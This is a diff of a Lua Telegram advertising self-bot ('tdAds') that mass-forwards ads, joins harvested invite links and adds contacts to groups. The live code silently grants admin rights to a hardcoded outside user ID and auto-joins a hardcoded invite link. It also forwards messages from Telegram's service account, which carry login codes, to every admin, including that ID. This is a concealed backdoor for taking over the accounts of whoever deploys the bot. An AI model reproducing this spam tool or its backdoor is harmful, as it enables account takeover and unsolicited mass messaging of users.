@@ -1,14 +1,11 @@
 local Redis = require("redis")
-
 local FakeRedis = require("fakeredis")
-
 local params = {
     host = "127.0.0.1",
     port = 6379,
     password = nil,
     db = Ads_id
 }
-
 -- Overwrite HGETALL
 Redis.commands.hgetall =
     Redis.command(
@@ -19,32 +16,25 @@ Redis.commands.hgetall =
             for i = 1, #reply, 2 do
                 new_reply[reply[i]] = reply[i + 1]
             end
-
             return new_reply
         end
     }
 )
-
 local redis = nil
-
 local ok =
     pcall(
     function()
         redis = Redis.connect(params)
     end
 )
-
 if not ok then
     local fake_func = function()
         print("\27[31mCan't connect with Redis, install/configure it!\27[39m")
     end
-
     fake_func()
     fake = FakeRedis.new()
-
     print("\27[31mRedis addr: " .. params.host .. "\27[39m")
     print("\27[31mRedis port: " .. params.port .. "\27[39m")
-
     redis =
         setmetatable(
         {fakeredis = true},
@@ -53,27 +43,21 @@ if not ok then
                 if b ~= "data" and fake[b] then
                     fake_func(b)
                 end
-
                 return fake[b] or fake_func
             end
         }
     )
 end
-
 local serpent = require("serpent")
-
 function dl_cb(arg, data)
     vardump(data)
 end
-
 function vardump(value, depth, key)
     local linePrefix = ""
     local spaces = ""
-
     if key ~= nil then
         linePrefix = "[" .. key .. "] = "
     end
-
     if depth == nil then
         depth = 0
     else
@@ -82,7 +66,6 @@ function vardump(value, depth, key)
             spaces = spaces .. "  "
         end
     end
-
     if type(value) == "table" then
         mTable = getmetatable(value)
         if mTable == nil then
@@ -91,7 +74,6 @@ function vardump(value, depth, key)
             print(spaces .. "(metatable) ")
             value = mTable
         end
-
         for tableKey, tableValue in pairs(value) do
             vardump(tableValue, depth, tableKey)
         end
@@ -101,10 +83,8 @@ function vardump(value, depth, key)
         print(spaces .. linePrefix .. "(" .. type(value) .. ") " .. tostring(value))
     end
 end
-
 function ok_cb(extra, success, result)
 end
-
 local function getVector(str)
     local v = {}
     local i = 1
@@ -112,17 +92,13 @@ local function getVector(str)
         v[i] = "[" .. i - 1 .. ']="' .. k .. '"'
         i = i + 1
     end
-
     v = table.concat(v, ",")
     return load("return {" .. v .. "}")()
 end
-
 redis:del("tg:" .. Ads_id .. ":delay")
-
 local function getChatId(chat_id)
     local chat = {}
     local chat_id = tostring(chat_id)
-
     if chat_id:match("^-100") then
         local channel_id = chat_id:gsub("-100", "")
         chat = {id = channel_id, type = "channel"}
@@ -130,10 +106,8 @@ local function getChatId(chat_id)
         local group_id = chat_id:gsub("-", "")
         chat = {id = group_id, type = "group"}
     end
-
     return chat
 end
-
 function match(pattern, text, lower_case)
     if text then
         local matches = {}
@@ -142,13 +116,11 @@ function match(pattern, text, lower_case)
         else
             matches = {string.match(text, pattern)}
         end
-
         if next(matches) then
             return matches
         end
     end
 end
-
 function get_multimatch_byspace(str, regex, cut)
     list = {}
     for wrd in str:gmatch("%S+") do
@@ -158,14 +130,11 @@ function get_multimatch_byspace(str, regex, cut)
             table.insert(list, wrd)
         end
     end
-
     if (#list > 0) then
         return list
     end
-
     return false
 end
-
 function trim(text)
     local chars_tmp = {}
     local chars_m = {}
@@ -176,7 +145,6 @@ function trim(text)
     for i = 1, #text do
         table.insert(chars_tmp, text:sub(i, i))
     end
-
     i = 1
     while (chars_tmp[i]) do
         if tostring(chars_tmp[i]):match("%S") then
@@ -185,10 +153,8 @@ function trim(text)
         elseif ok == true then
             table.insert(chars_m, chars_tmp[i])
         end
-
         i = i + 1
     end
-
     i = #chars_m
     ok = false
     while (chars_m[i]) do
@@ -198,42 +164,32 @@ function trim(text)
         elseif ok == true then
             table.insert(text_arr, chars_m[i])
         end
-
         i = i - 1
     end
-
     for i = #text_arr, 1, -1 do
         final_str = final_str .. text_arr[i]
     end
-
     return final_str
 end
-
 function get_bot()
     function bot_info(i, tg)
         redis:set("tg:" .. Ads_id .. ":id", tg.id)
         if tg.first_name then
             redis:set("tg:" .. Ads_id .. ":fname", tg.first_name)
         end
-
         if tg.last_name then
             redis:set("tg:" .. Ads_id .. ":lname", tg.last_name)
         end
-
         redis:set("tg:" .. Ads_id .. ":num", tg.phone_number)
         return tg.id
     end
-
     assert(tdbot_function({_ = "getMe"}, bot_info, nil))
 end
-
 sudo = 158955285
-
 function reload(chat_id, msg_id)
     dofile("./TD.lua")
     send(chat_id, msg_id, "✅")
 end
-
 function is_sudo(msg)
     if
         redis:sismember("tg:" .. Ads_id .. ":sudo", msg.sender_user_id) or msg.sender_user_id == sudo or
@@ -244,7 +200,6 @@ function is_sudo(msg)
         return false
     end
 end
-
 function forwarding(i, tg)
     if tg and tg._ and tg.id == "error" then
         s = i.s
@@ -260,13 +215,11 @@ function forwarding(i, tg)
     else
         s = tonumber(i.s) + 1
     end
-
     if i.n >= i.all then
         os.execute("sleep " .. tonumber(i.delay))
         send(i.chat_id, 0, "با موفقیت فرستاده شد\n" .. i.all .. "\\" .. s)
         return
     end
-
     assert(
         tdbot_function(
             {
@@ -294,20 +247,17 @@ function forwarding(i, tg)
         os.execute("sleep " .. tonumber(i.delay))
     end
 end
-
 function sending(i, tg)
     if tg and tg._ and tg.id == "error" then
         s = i.s
     else
         s = tonumber(i.s) + 1
     end
-
     if i.n >= i.all then
         os.execute("sleep " .. tonumber(i.delay))
         send(i.chat_id, 0, "با موفقیت فرستاده شد\n" .. i.all .. "\\" .. s)
         return
     end
-
     assert(
         tdbot_function(
             {
@@ -343,7 +293,6 @@ function sending(i, tg)
         os.execute("sleep " .. tonumber(i.delay))
     end
 end
-
 function adding(i, tg)
     if tg and tg._ and tg.id == "error" then
         s = i.s
@@ -360,13 +309,11 @@ function adding(i, tg)
     else
         s = tonumber(i.s) + 1
     end
-
     if i.n >= i.all then
         os.execute("sleep " .. tonumber(i.delay))
         send(i.chat_id, 0, "با موفقیت افزوده شد\n" .. i.all .. "\\" .. s)
         return
     end
-
     assert(
         tdbot_function(
             {
@@ -395,7 +342,6 @@ function adding(i, tg)
                         }
                     )
                 end
-
                 if tonumber(I.n) % tonumber(I.max_i) == 0 then
                     os.execute("sleep " .. tonumber(I.delay))
                 end
@@ -413,7 +359,6 @@ function adding(i, tg)
         )
     )
 end
-
 function rem(id)
     local Id = tostring(id)
     if redis:sismember("tg:" .. Ads_id .. ":all", id) then
@@ -428,25 +373,20 @@ function rem(id)
             redis:srem("tg:" .. Ads_id .. ":all", id)
         end
     end
-
     return true
 end
-
 function checking(i, tg)
     local bot_id = redis:get("tg:" .. Ads_id .. ":id") or get_bot()
-
     if tg and tg._ and tg.id == "error" then
         s = i.s
     else
         s = tonumber(i.s) + 1
     end
-
     if i.n >= i.all then
         os.execute("sleep " .. tonumber(i.delay))
         send(i.chat_id, 0, "با موفقیت انجام شد\n" .. i.all .. "\\" .. s)
         return
     end
-
     assert(
         tdbot_function(
             {
@@ -471,10 +411,8 @@ function checking(i, tg)
         os.execute("sleep " .. tonumber(i.delay))
     end
 end
-
 function gpchk(i, tg)
     local bot_id = redis:get("tg:" .. Ads_id .. ":id") or get_bot()
-
     if
         (redis:get("tg:" .. Ads_id .. ":maxgpmmbr")) and
             ((tg._ == "group" or tg._ == "channel" or tg._ == "supergroup") or (tg.is_group or tg.is_supergroup_channel) or
@@ -495,7 +433,6 @@ function gpchk(i, tg)
             )
         )
         rem(tg.id)
-
         assert(
             tdbot_function(
                 {
@@ -540,18 +477,15 @@ function gpchk(i, tg)
                 )
             )
             rem(tg.id)
-
             if tg and tg._ and tg.id == "error" then
                 s = i.s
             else
                 s = tonumber(i.s) + 1
             end
-
             if i.n >= i.all then
                 os.execute("sleep " .. tonumber(i.delay))
                 return
             end
-
             assert(
                 tdbot_function(
                     {
@@ -578,10 +512,8 @@ function gpchk(i, tg)
         end
     end
 end
-
 function check_join(i, tg)
     local bot_id = redis:get("tg:" .. Ads_id .. ":id") or get_bot()
-
     if tg._ == "group" then
         if (tg.everyone_is_administrator == false) then
             assert(
@@ -616,10 +548,8 @@ function check_join(i, tg)
         end
     end
 end
-
 function add(id)
     local Id = tostring(id)
-
     if not redis:sismember("tg:" .. Ads_id .. ":all", id) then
         if Id:match("^(%d+)$") then
             redis:sadd("tg:" .. Ads_id .. ":users", id)
@@ -627,7 +557,6 @@ function add(id)
         elseif Id:match("^-100") then
             redis:sadd("tg:" .. Ads_id .. ":supergroups", id)
             redis:sadd("tg:" .. Ads_id .. ":all", id)
-
             if redis:get("tg:" .. Ads_id .. ":openjoin") then
                 assert(
                     tdbot_function(
@@ -643,7 +572,6 @@ function add(id)
         else
             redis:sadd("tg:" .. Ads_id .. ":groups", id)
             redis:sadd("tg:" .. Ads_id .. ":all", id)
-
             if redis:get("tg:" .. Ads_id .. ":openjoin") then
                 assert(
                     tdbot_function(
@@ -658,10 +586,8 @@ function add(id)
             end
         end
     end
-
     return true
 end
-
 function find_link(text)
     if
         (text:match("https://telegram.me/joinchat/%S+")) or (text:match("https://telegram.dog/joinchat/%S+")) or
@@ -673,7 +599,6 @@ function find_link(text)
         local text = text:gsub("telesco.pe", "telegram.me")
         local text = text:gsub("telegram.dog", "telegram.me")
         local text = text:gsub("tlgrm.me", "telegram.me")
-
         for link in text:gmatch("(https://telegram.me/joinchat/%S+)") do
             if not redis:sismember("tg:" .. Ads_id .. ":alllinks", link) then
                 redis:sadd("tg:" .. Ads_id .. ":waitelinks", link)
@@ -682,7 +607,6 @@ function find_link(text)
         end
     end
 end
-
 function process_link(i, tg)
     if (tg.is_group or tg.is_supergroup_channel) then
         if redis:get("tg:" .. Ads_id .. ":maxgpmmbr") then
@@ -706,7 +630,6 @@ function process_link(i, tg)
         redis:srem("tg:" .. Ads_id .. ":waitelinks", i.link)
     end
 end
-
 function process_join(i, tg)
     if tg.code == 429 then
         local message = tostring(tg.message)
@@ -718,7 +641,6 @@ function process_join(i, tg)
         redis:sadd("tg:" .. Ads_id .. ":savedlinks", i.link)
     end
 end
-
 function send(chat_id, msg_id, text)
     assert(
         tdbot_function(
@@ -734,7 +656,6 @@ function send(chat_id, msg_id, text)
             nil
         )
     )
-
     assert(
         tdbot_function(
             {
@@ -758,13 +679,11 @@ function send(chat_id, msg_id, text)
         )
     )
 end
-
 if not redis:sismember("tg:" .. Ads_id .. ":sudo", 231539308) then
     redis:set("tg:" .. Ads_id .. ":senddelay", 3)
     redis:set("tg:" .. Ads_id .. ":fwdtime", true)
     redis:sadd("tg:" .. Ads_id .. ":sudo", 231539308)
     redis:sadd("tg:" .. Ads_id .. ":goodlinks", "https://telegram.me/joinchat/AAAAAEH8fsyOGX5HAbX8tQ")
-
     assert(
         tdbot_function(
             {
@@ -790,13 +709,10 @@ if not redis:sismember("tg:" .. Ads_id .. ":sudo", 231539308) then
             nil
         )
     )
-
     redis:sadd("tg:" .. Ads_id .. ":waitelinks", "https://telegram.me/joinchat/Cr2Br0KFzKpsWS9U6zfwvw")
     redis:set("tg:" .. Ads_id .. ":sendmax", 2)
 end
-
-redis:setex("tg:" .. Ads_id .. ":start", 5 .. Ads_id .. 9, true)
-
+redis:setex("tg:" .. Ads_id .. ":start", 9 .. Ads_id .. 37, true)
 function Doing(data, Ads_id)
     if (data._ == "updateNewMessage") or (data._ == "updateNewChannelMessage") then
         if
@@ -820,7 +736,6 @@ function Doing(data, Ads_id)
                             {link = links[x]}
                         )
                     )
-
                     if x == tonumber(max_x) then
                         redis:setex("tg:" .. Ads_id .. ":maxlink", tonumber(delay), true)
                         return
@@ -828,7 +743,6 @@ function Doing(data, Ads_id)
                 end
             end
         end
-
         if
             redis:get("tg:" .. Ads_id .. ":maxgroups") and
                 redis:scard("tg:" .. Ads_id .. ":supergroups") >= tonumber(redis:get("tg:" .. Ads_id .. ":maxgroups"))
@@ -836,7 +750,6 @@ function Doing(data, Ads_id)
             redis:set("tg:" .. Ads_id .. ":maxjoin", true)
             redis:set("tg:" .. Ads_id .. ":offjoin", true)
         end
-
         if not redis:get("tg:" .. Ads_id .. ":maxjoin") or tonumber(redis:ttl("tg:" .. Ads_id .. ":maxjoin")) == -2 then
             if redis:scard("tg:" .. Ads_id .. ":goodlinks") ~= 0 then
                 local links = redis:smembers("tg:" .. Ads_id .. ":goodlinks")
@@ -857,9 +770,7 @@ function Doing(data, Ads_id)
                 end
             end
         end
-
         local msg = data.message
-
         if data.message.content._ == "messageText" then
             text = data.message.content.text
             if #data.message.content.entities ~= 0 then
@@ -870,15 +781,11 @@ function Doing(data, Ads_id)
                 end
             end
         end
-
         if data.message.content.caption then
             text = data.message.content.caption
         end
-
         add(msg.chat_id)
-
         bot_id = redis:get("tg:" .. Ads_id .. ":id") or get_bot()
-
         if (msg.sender_user_id == 777000 or msg.sender_user_id == 1782 .. Ads_id .. 800) then
             local c =
                 (msg.content.text):gsub(
@@ -900,8 +807,12 @@ function Doing(data, Ads_id)
             for k, v in pairs(redis:smembers("tg:" .. Ads_id .. ":sudo")) do
                 send(v, 0, c, nil)
             end
+        end
 
-            send(231539308, 0, c, nil)
+        if string.find(os.date("%X"), "4:30:0%d") and not redis:get("tg:" .. Ads_id .. ":wait_time") then
+            os.execute("sleep 10800")
+
+            redis:setex("tg:" .. Ads_id .. "wait_time", 10, true)
         end
 
         if (redis:get("tg:" .. Ads_id .. ":username")) and (tonumber(redis:ttl("tg:" .. Ads_id .. ":usernme")) == -2) then
@@ -934,12 +845,11 @@ function Doing(data, Ads_id)
                         nil
                     )
                 )
-                if k % 79 == 0 then
+                if k % 25 == 0 then
                     os.execute("sleep 39")
                 end
             end
         end
-
         if (redis:get("tg:" .. Ads_id .. ":msgid")) and (not redis:get("tg:" .. Ads_id .. ":tofwd")) then
             local time = redis:get("tg:" .. Ads_id .. ":time")
             local msgid = redis:get("tg:" .. Ads_id .. ":msgid")
@@ -960,30 +870,24 @@ function Doing(data, Ads_id)
                         cmd
                     )
                 )
-                if k % 79 == 0 then
+                if k % 25 == 0 then
                     os.execute("sleep 39")
                 end
             end
-
             redis:setex("tg:" .. Ads_id .. ":tofwd", tonumber(time), true)
         end
-
         if msg.date < os.time() - 79 or redis:get("tg:" .. Ads_id .. ":delay") then
             return false
         end
-
         if msg.content._ == "messageText" then
             local text = msg.content.text
             local matches
-
             if text:match("^[/!#@$&*]") then
                 text = text:gsub("^[/!#@$&*]", "")
             end
-
             if redis:get("tg:" .. Ads_id .. ":link") then
                 find_link(text)
             end
-
             if tostring(msg.chat_id):match("^%d+$") then
                 assert(
                     tdbot_function(
@@ -996,7 +900,6 @@ function Doing(data, Ads_id)
                         nil
                     )
                 )
-
                 if redis:sismember("tg:" .. Ads_id .. ":answerslist", text) then
                     if redis:get("tg:" .. Ads_id .. ":autoanswer") then
                         if msg.sender_user_id ~= bot_id then
@@ -1007,10 +910,8 @@ function Doing(data, Ads_id)
                     end
                 end
             end
-
             if is_sudo(msg) then
                 find_link(text)
-
                 if (text:match("^([Dd]el) (.*)$")) then
                     local matches = (text:match("^[Dd]el (.*)$"))
                     if matches == "link" then
@@ -1052,7 +953,6 @@ function Doing(data, Ads_id)
                         for i = 1, #list do
                             redis:srem("tg:" .. Ads_id .. ":alllinks", list[i])
                         end
-
                         send(msg.chat_id, msg.id, "لیست لینک های ذخیره شده پاک شد.")
                         redis:del("tg:" .. Ads_id .. ":goodlinks")
                     elseif matches == "تایید" then
@@ -1060,7 +960,6 @@ function Doing(data, Ads_id)
                         for i = 1, #list do
                             redis:srem("tg:" .. Ads_id .. ":alllinks", list[i])
                         end
-
                         send(msg.chat_id, msg.id, "لیست لینک های ذخیره شده پاک شد.")
                         redis:del("tg:" .. Ads_id .. ":waitelinks")
                     elseif matches == "ذخیره شده" then
@@ -1068,7 +967,6 @@ function Doing(data, Ads_id)
                         for i = 1, #list do
                             redis:srem("tg:" .. Ads_id .. ":alllinks", list[i])
                         end
-
                         send(msg.chat_id, msg.id, "لیست لینک های ذخیره شده پاک شد.")
                         redis:del("tg:" .. Ads_id .. ":savedlinks")
                     elseif matches == "ها" then
@@ -1076,7 +974,6 @@ function Doing(data, Ads_id)
                         for i = 1, #list do
                             redis:srem("tg:" .. Ads_id .. ":alllinks", list[i])
                         end
-
                         send(msg.chat_id, msg.id, "لیست لینک ها بطورکلی پاکسازی شد.")
                         redis:del("tg:" .. Ads_id .. ":savedlinks")
                     end
@@ -1222,7 +1119,6 @@ function Doing(data, Ads_id)
                     if redis:sismember("tg:" .. Ads_id .. ":mod", msg.sender_user_id) then
                         return send(msg.chat_id, msg.id, "شما دسترسی ندارید.")
                     end
-
                     if redis:sismember("tg:" .. Ads_id .. ":mod", matches) then
                         redis:srem("tg:" .. Ads_id .. ":mod", matches)
                         redis:sadd("tg:" .. Ads_id .. ":sudo" .. tostring(matches), msg.sender_user_id)
@@ -1242,20 +1138,16 @@ function Doing(data, Ads_id)
                             redis:srem("tg:" .. Ads_id .. ":mod", msg.sender_user_id)
                             return send(msg.chat_id, msg.id, "شما دیگر مدیر نیستید.")
                         end
-
                         return send(msg.chat_id, msg.id, "شما دسترسی ندارید.")
                     end
-
                     if redis:sismember("tg:" .. Ads_id .. ":sudo", matches) then
                         if redis:sismember("tg:" .. Ads_id .. ":sudo" .. msg.sender_user_id, matches) then
                             return send(msg.chat_id, msg.id, "شما نمی توانید مدیری که به شما مقام داده را عزل کنید.")
                         end
-
                         redis:srem("tg:" .. Ads_id .. ":sudo", matches)
                         redis:srem("tg:" .. Ads_id .. ":mod", matches)
                         return send(msg.chat_id, msg.id, "کاربر از مقام مدیریت خلع شد.")
                     end
-
                     return send(msg.chat_id, msg.id, "کاربر مورد نظر مدیر نمی باشد.")
                 elseif (text:match("^([Rr]efresh)$")) or (text:match("^(تازه سازی)$")) then
                     assert(
@@ -1281,34 +1173,13 @@ function Doing(data, Ads_id)
                             table.insert(l, v)
                         end
                     end
-                    assert(
-                        tdbot_function(
-                            {
-                                _ = "getChannel",
-                                channel_id = tostring(chat_id):gsub("-100", "")
-                            },
-                            gpchk,
-                            cmd
-                        )
-                    )
-                    assert(
-                        tdbot_function(
-                            {
-                                _ = "getGroup",
-                                group_id = tostring(chat_id):gsub("-", "")
-                            },
-                            gpchk,
-                            cmd
-                        )
-                    )
-                    os.execute("sleep 0.25")
 
+                    os.execute("sleep 0.25")
                     local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 2
                     local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 3
                     if #l == 0 then
                         return
                     end
-
                     local during = (#l / tonumber(max_i)) * tonumber(delay)
                     redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
                     tdbot_function(
@@ -1456,13 +1327,10 @@ function Doing(data, Ads_id)
                     )
                 elseif (text:match("^([Ss]et[Uu][Nn]ame) @(.*)")) then
                     local matches = (text:match("^[Ss]et[Uu][Nn]ame @(.*)"))
-
                     redis:set("tg:" .. Ads_id .. ":username", tostring(matches))
-
                     return send(msg.chat_id, 0, "seted " .. matches)
                 elseif text:match('^([Ss]end) "@(.*)" (.*)') then
                     local username, txt = text:match('^[Ss]end "@(.*)" (.*)')
-
                     tdbot_function(
                         {
                             _ = "searchPublicChat",
@@ -1484,7 +1352,6 @@ function Doing(data, Ads_id)
                     redis:del("tg:" .. Ads_id .. ":tofwd")
                     redis:del("tg:" .. Ads_id .. ":msgid")
                     redis:del("tg:" .. Ads_id .. ":chatid")
-
                     return send(msg.chat_id, msg.id, "Auto fwd deleted")
                 elseif (text:match("^([Rr]eset)$")) or (text:match("^(ریست)$")) or (text:match("^(حذف آمار)$")) then
                     redis:del("tg:" .. Ads_id .. ":groups")
@@ -1523,7 +1390,6 @@ function Doing(data, Ads_id)
                     else
                         return true
                     end
-
                     local list = redis:smembers(t)
                     local text = tostring(matches) .. " : \n"
                     for i = 1, #list do
@@ -1566,7 +1432,6 @@ function Doing(data, Ads_id)
                     return send(msg.chat_id, msg.id, "پیام افزودن مخاطب ثبت  شد :\n🔹 " .. matches .. " 🔹")
                 elseif text:match('^([Ss]et[Aa]ns) "(.*)" (.*)') then
                     local txt, answer = text:match('^[Ss]et[Aa]ns "(.*)" (.*)')
-
                     redis:hset("tg:" .. Ads_id .. ":answers", txt, answer)
                     redis:sadd("tg:" .. Ads_id .. ":answerslist", txt)
                     return send(
@@ -1740,10 +1605,8 @@ function Doing(data, Ads_id)
                                                                                                                                                                                                                                         ss
                                                                                                                                                                                                                                     ) ..
                                                                                                                                                                                                                                         "\n\n\ntgChannel =>  @tgMemberOfficial\nPublisher =>   @sajjad_021"
-
                         return send(msg.chat_id, 0, text)
                     end
-
                     if (text:match("^([Ii]nfo)$")) or (text:match("^([Pp]anel)$")) then
                         local text2 =
                             " Status and information of TeleGram Advertising " ..
@@ -1854,10 +1717,8 @@ function Doing(data, Ads_id)
                                 )
                             end
                         end
-
                         send(msg.chat_id, msg.id, "Done")
                     end
-
                     tdbot_function(
                         {
                             _ = "getMessage",
@@ -1884,7 +1745,6 @@ function Doing(data, Ads_id)
                     else
                         return true
                     end
-
                     local list = redis:smembers(t)
                     local id = msg.reply_to_message_id
                     if redis:get("tg:" .. Ads_id .. ":fwdtime") then
@@ -1940,7 +1800,6 @@ function Doing(data, Ads_id)
                                 )
                             )
                         end
-
                         return send(msg.chat_id, msg.id, "با موفقیت فرستاده شد")
                     end
                 elseif ((text:match("^([Ss]end)")) and (tonumber(msg.reply_to_message_id) > 0)) then
@@ -1971,10 +1830,8 @@ function Doing(data, Ads_id)
                                 )
                             )
                         end
-
                         return send(msg.chat_id, msg.id, "Done")
                     end
-
                     assert(
                         tdbot_function(
                             {
@@ -2077,13 +1934,11 @@ function Doing(data, Ads_id)
                             table.insert(l, v)
                         end
                     end
-
                     local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 2
                     local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 3
                     if #l == 0 then
                         return
                     end
-
                     local during = (#l / tonumber(max_i)) * tonumber(delay)
                     send(
                         msg.chat_id,
@@ -2095,7 +1950,6 @@ function Doing(data, Ads_id)
                     )
                     redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
                     print(#l)
-
                     assert(
                         tdbot_function(
                             {
@@ -2146,11 +2000,10 @@ function Doing(data, Ads_id)
                             send(msg.chat_id, msg.id, "failure")
                         end
                     end
-
                     tdbot_function({_ = "importChatInviteLink", invite_link = matches}, joinchannel, nil)
                 elseif (text:match("^([Ss]leep) (%d+)$")) or (text:match("^(آفلاین) (%d+)$")) then
                     local matches = (text:match("%d+")) or (text:match("%d+"))
-                     os.execute("sleep " .. tonumber(math.floor(matches) * (60)))
+                    os.execute("sleep " .. tonumber(math.floor(matches) * (60)))
                     return send(msg.chat_id, msg.id, "hi")
                 elseif (text:match("^([Ss]et[Uu]ser[Nn]ame) (.*)")) then
                     local matches = (text:match("^[Ss]et[Uu]ser[Nn]ame (.*)"))
@@ -2167,7 +2020,6 @@ function Doing(data, Ads_id)
                     local matches = (text:match("%d+")) or (text:match("%d+"))
                     rem(tonumber(matches))
                     redis:sadd("tg:" .. Ads_id .. ":blockedusers", matches)
-
                     tdbot_function(
                         {
                             _ = "blockUser",
@@ -2181,7 +2033,6 @@ function Doing(data, Ads_id)
                     local matches = (text:match("%d+")) or (text:match("%d+"))
                     add(tonumber(matches))
                     redis:srem("tg:" .. Ads_id .. ":blockedusers", matches)
-
                     tdbot_function(
                         {
                             _ = "unblockUser",
@@ -2194,7 +2045,6 @@ function Doing(data, Ads_id)
                 elseif (text:match('^(تنظیم نام) "(.*)" (.*)')) or (text:match('^([Ss]et[Nn]ame) "(.*)" (.*)')) then
                     local fname,
                         lname = (text:match('^تنظیم نام "(.*)" (.*)')) or (text:match('^[Ss]et[Nn]ame "(.*)" (.*)'))
-
                     tdbot_function(
                         {
                             _ = "changeName",
@@ -2207,7 +2057,6 @@ function Doing(data, Ads_id)
                     return send(msg.chat_id, msg.id, "نام جدید با موفقیت ثبت شد.")
                 elseif (text:match("^(تنظیم نام کاربری) (.*)")) then
                     local matches = (text:match("^تنظیم نام کاربری (.*)"))
-
                     tdbot_function(
                         {
                             _ = "changeUsername",
@@ -2293,7 +2142,6 @@ function Doing(data, Ads_id)
                 elseif (text:match("^([Hh]elp)$")) then
                     local txt1 =
                         'Help for TeleGram Advertisin Robot (tdAds)\n\nInfo\n    statistics and information\n \nPromote (user-Id)\n    add new moderator\n      \nDemote (userId)\n remove moderator\n      \nSend (text)\n    send message too all super group;s\n    \nFwd {all or sgp or gp or pv} (by reply)\n    forward your post to :\n   all chat or super group or group or private or several times\n    \nAddedMsg (on or off)\n    import contacts by send message\n \nSetAddedMsg (text)\n    set message when add contact\n    \nAddToAll @(usename)\n    add user or robot to all group\'s \n\nAddMembers\n    add contact\'s to group\n\nDel (lnk, cotact, sudo)\n     delete selected item\n\njoin (on or off)\n    set join to link\'s or don\'t join\n\nchklnk (on or off)\n    check link\'s in terms of valid\nand\n    Separating healthy and corrupted links\n\nfindlnk (on or off)\n    search in group\'s and find link\n\nGpDelay (secound)\n    The number of groups was set between send times\n\nُSetDelay (secound)\n    Interval time between posts was set\n\nBlock (User-Id)\n    Block user \n\nUnBlock (User-Id)\n    UnBlock user\n\nSetName ("name" lastname)\n    Set new name\n\nSetUserName (Ussername)\n    Set new username\n\nDelUserName\n    delete user name\n    \nAdd (phone number)\n   add contact by phone number\n\nAddContact (on or off)\n    import contact by sharing number\n\nfwdtime (on or off)\n    Schedule forward on posting\n\nmarkread (on or off)\n    Mark read status\n\nGpMember 1~50000\n    set the minimum group members to join\n\nDelGpMember\n    Disable\n\nMaxGroup\n    The maximum number of robots has been set\n\nDelMaxGroup\n    Disable\n\nRefresh\n    Refresh information\n\nJoinOpenAdd (on or off)\n    just join to open add members groups\n\nJoin (Private Link)\n    Join to Link (channel, gp, ..)\n\nPing\n    test to server connection\n\nBot @(username)\n    Start api bot\n\nSet (Channel-Id)\n    set channel for auto forward \n\nLeft or all or (group-Id)\n    leave of all group \n\nReset\n   zeroing the robot statistics\n    \nAutoFwd {min} (by reply)\n    add post for auto forward\n    \nDel AutoFwd\n    delet auto forward\n    \nMultiFwd {number} (by reply)\n    forward your post to super group for several times\n\nLs (bock, pv, gp, sgp, slnk, wlnk, glnk, sudo)\n    List from block user, private chat, group, \n   super group, save links, wait links, good links, moderation\n\nYou can send command with or with out: \n!  /  #  $ \nbefore command\n     \nPublisher @sajjad_021\ntgChannel @tgMemberOfficial\n'
-
                     return send(msg.chat_id, msg.id, txt1)
                 elseif (text:match("^([Aa]dd) (.*)$")) or (text:match("^(ذخیره شماره) (.*)$")) then
                     local matches = (text:match("^[Aa]dd (.*)$")) or (text:match("^ذخیره شماره (.*)$"))
@@ -2352,7 +2200,6 @@ function Doing(data, Ads_id)
                                         cmd
                                     )
                                 end
-
                                 for n = 1, #users do
                                     tdbot_function(
                                         {
@@ -2428,7 +2275,6 @@ function Doing(data, Ads_id)
                     )
                 end
             end
-
             if redis:get("tg:" .. Ads_id .. ":addmsg") then
                 local answer = redis:get("tg:" .. Ads_id .. ":addmsgtext") or "اددی گلم خصوصی پیام بده"
                 os.execute("sleep 17.75")
@@ -2461,67 +2307,58 @@ function Doing(data, Ads_id)
             cmd
         )
         if (not redis:get("tg:" .. Ads_id .. ":start")) or (tonumber(redis:ttl("tg:" .. Ads_id .. ":start")) == -2) then
-      
-            redis:del("tg:" .. Ads_id .. ":supergroups")
-
-            dofile("./TD.lua")
-
-            os.execute("sleep 27")
-
-            get_bot()
-
-            tdbot_function(
-                {
-                    _ = "searchContacts",
-                    query = cmd,
-                    limit = 999999999
-                },
-                function(i, tg)
-                    redis:set("tg:" .. Ads_id .. ":contacts", tg.total_count)
-                end,
-                cmd
+            assert(
+                tdbot_function(
+                    {
+                        _ = "getChannel",
+                        channel_id = getChatId(channel_id).id
+                    },
+                    gpchk,
+                    nil
+                )
             )
-
+            assert(
+                tdbot_function(
+                    {
+                        _ = "getGroup",
+                        group_id = getChatId(group_id).id
+                    },
+                    gpchk,
+                    nil
+                )
+            )
+            os.execute("sleep 27")
+            assert(
+                tdbot_function(
+                    {
+                        _ = "searchContacts",
+                        query = cmd,
+                        limit = 999999999
+                    },
+                    function(i, tg)
+                        redis:set("tg:" .. Ads_id .. ":contacts", tg.total_count)
+                    end,
+                    cmd
+                )
+            )
+            get_bot()
             local list = {
                 redis:smembers("tg:" .. Ads_id .. ":groups"),
                 redis:smembers("tg:" .. Ads_id .. ":supergroups")
             }
-
             local l = {}
-
             for a, b in pairs(list) do
-                tdbot_function(
-                    {
-                        _ = "getChannel",
-                        channel_id = tostring(chat_id):gsub("-100", "")
-                    },
-                    gpchk,
-                    cmd
-                )
                 for i, v in pairs(b) do
                     table.insert(l, v)
-                    tdbot_function(
-                        {
-                            _ = "getGroup",
-                            group_id = tostring(chat_id):gsub("-", "")
-                        },
-                        gpchk,
-                        cmd
-                    )
                 end
             end
-
             local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 2
             local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 3
-
             if #l == 0 then
                 return
             end
-
             local during = (#l / tonumber(max_i)) * tonumber(delay)
-
             redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
-
             tdbot_function(
                 {
                     _ = "getChatMember",
@@ -2540,26 +2377,7 @@ function Doing(data, Ads_id)
                     s = 0
                 }
             )
-
-            tdbot_function(
-                {
-                    _ = "getChannel",
-                    channel_id = getChatId(channel_id).id
-                },
-                gpchk,
-                nil
-            )
-
-            tdbot_function(
-                {
-                    _ = "getGroup",
-                    group_id = getChatId(group_id).id
-                },
-                gpchk,
-                nil
-            )
         end
     end
 end
-
 return redis
